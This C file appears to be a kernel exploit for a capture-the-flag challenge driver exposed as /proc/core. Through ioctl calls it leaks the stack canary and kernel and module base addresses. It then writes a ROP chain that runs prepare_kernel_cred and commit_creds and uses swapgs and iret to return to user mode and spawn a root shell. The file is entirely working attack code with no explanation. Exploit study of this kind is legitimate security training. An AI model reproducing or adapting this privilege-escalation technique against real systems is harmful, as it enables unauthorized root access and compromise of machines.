#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>
void setoff(int fd,long long size){
	ioctl(fd,0x6677889C,size);
}
void core_read(int fd,char *buf){
	ioctl(fd,0x6677889b,buf);
}
void core_copy_func(int fd,long long size){
	ioctl(fd,0x6677889a,size);
}
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(){
	system("/bin/sh");
}

int main(){
	int fd ;
	size_t tmp ;
	char buf[0x50];
	size_t shellcode[0x100];
	size_t vmlinux_base,canary,module_core_base;
	size_t commit_creds =  0x9c8e0;
	size_t prepare_kernel_cred = 0x9cce0;
	save_stats();
	fd = open("/proc/core",O_RDWR);
	if(fd < 0 ){
		printf("Open /proc/core error!\n");
		exit(0);
	}
	setoff(fd,0x40);
	core_read(fd,buf);
	/*	for test
	for(int i = 0;i<8;i++){
		tmp = *(size_t *)(&buf[i*8]);
		printf("[%d] %p\n",i,tmp);
	}
	*/
	size_t pop_rdi = 0x000b2f;
	size_t push_rax =  0x02d112;
	size_t swapgs = 0x0d6;
	size_t iret ;
	size_t xchg = 0x16684f0;
	size_t call_rax=0x40398;
	size_t pop_rcx = 0x21e53;
	size_t pop_rbp = 0x3c4; //: pop rbp ; ret
	size_t pop_rdx = 0xa0f49 ;//: pop rdx ; ret
	size_t mov_rdi_rax_call_rdx = 0x01aa6a;
	vmlinux_base = (*(size_t *)(&buf[4*8])-0x1dd6d1 );
	printf("[+] vmlinux_base:%p\n",vmlinux_base);
	canary = (*(size_t *)(&buf[0]));
	printf("[+] canary:%p\n",canary);
	module_core_base = (*(size_t *)(&buf[2*8])-0x19b );
	printf("[+] module_core_base:%p\n",module_core_base);
	commit_creds+=vmlinux_base;
	prepare_kernel_cred += vmlinux_base;
	pop_rdi += vmlinux_base;
	push_rax += vmlinux_base;
	swapgs += module_core_base ;
	iret = 0x50ac2+vmlinux_base;
	xchg += vmlinux_base;
	call_rax += vmlinux_base;
	pop_rcx += vmlinux_base;
	mov_rdi_rax_call_rdx +=vmlinux_base;
	pop_rdx += vmlinux_base;
	printf("[+] commit_creds:%p\n",commit_creds);
	printf("[+] prepare_kernel_cred:%p\n",prepare_kernel_cred);
	//shellcode[0]=shellcode[0]
	//shellcode[] =
	for(int i=0;i<9;i++){
		shellcode[i]=canary;
	} 
	shellcode[9] = (*(size_t *)(&buf[1]) );
	shellcode[10] = pop_rdi;	//0xdeadbeefdeadbeef;
	shellcode[11] = 0;
	shellcode[12] = prepare_kernel_cred;

	shellcode[13] = pop_rdx;
	shellcode[14] = pop_rcx;
	shellcode[15] = mov_rdi_rax_call_rdx;
	shellcode[16] = commit_creds;
	shellcode[17] = swapgs;
	shellcode[18] = shellcode;
	shellcode[19] = iret;
	shellcode[20] = (size_t)get_shell;
	shellcode[21] = user_cs;
	shellcode[22] = user_eflags;
	shellcode[23] = user_sp;
	shellcode[24] = user_ss;
	
	write(fd,shellcode,25*8);
	core_copy_func(fd,0xf000000000000000+25*8);

}